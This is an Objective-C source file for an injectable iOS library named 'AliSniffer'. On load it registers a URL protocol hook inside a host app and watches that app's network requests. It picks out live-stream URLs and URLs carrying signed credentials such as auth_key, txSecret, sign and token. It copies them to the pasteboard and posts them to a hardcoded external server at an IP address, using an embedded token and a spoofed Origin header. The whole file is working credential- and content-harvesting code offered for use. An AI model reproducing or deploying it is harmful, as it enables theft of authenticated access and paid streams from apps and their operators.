#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const NSTimeInterval kInstallDelay = 2.5;   // 可按需再加长
static const BOOL kPopupOnAuth  = YES;
static const BOOL kPopupOnPlain = YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

#pragma mark - 工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static void popupLoaded(void){
    popup(@"AliSniffer 已加载", @"被动嗅探：注册 NSURLProtocol 只观测不拦截；auth_key 优先；命中即弹窗+复制+上报。", nil);
}

static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] || [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    || [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"]||[s containsString:@"phonelive"]||
        [s containsString:@"replay"]||[s containsString:@"pull."]||
        [s containsString:@"live"]  ||[s containsString:@"weizan"]||[s containsString:@"vzan"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}

static void handleURL(NSString *u, NSString *from){
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    postText(u);
    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
}

#pragma mark - 被动嗅探：NSURLProtocol

@interface AliPassiveProtocol : NSURLProtocol
@end

@implementation AliPassiveProtocol
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    @try{
        NSString *u = request.URL.absoluteString;
        if (u.length) {
            // 仅观察：命中则处理并放行
            if (looksLikeStream(u)) {
                dispatch_async(gq, ^{ handleURL(u, @"NSURLProtocol"); });
            }
        }
    }@catch(__unused NSException *e){}
    // 不接管，让系统继续按原路径加载
    return NO;
}
+ (BOOL)canInitWithTask:(NSURLSessionTask *)task {
    @try{
        NSURLRequest *req = nil;
        if (task){
            if ([task respondsToSelector:@selector(currentRequest)])
                req = task.currentRequest;
            if (!req && [task respondsToSelector:@selector(originalRequest)])
                req = task.originalRequest;
        }
        NSString *u = req.URL.absoluteString;
        if (u.length) {
            if (looksLikeStream(u)) {
                dispatch_async(gq, ^{ handleURL(u, @"NSURLProtocol(Task)"); });
            }
        }
    }@catch(__unused NSException *e){}
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }
@end

#pragma mark - 注册

static void install_protocol(void){
    @try{
        [NSURLProtocol registerClass:AliPassiveProtocol.class];
        popupLoaded();
    }@catch(__unused NSException *e){}
}

#pragma mark - 入口

__attribute__((constructor))
static void AliSnifferInit(void){
    @try{
        if (!gq)    gq    = dispatch_queue_create("com.alisniffer.passive", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInstallDelay * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            install_protocol();
        });
    }@catch(__unused NSException *e){}
}
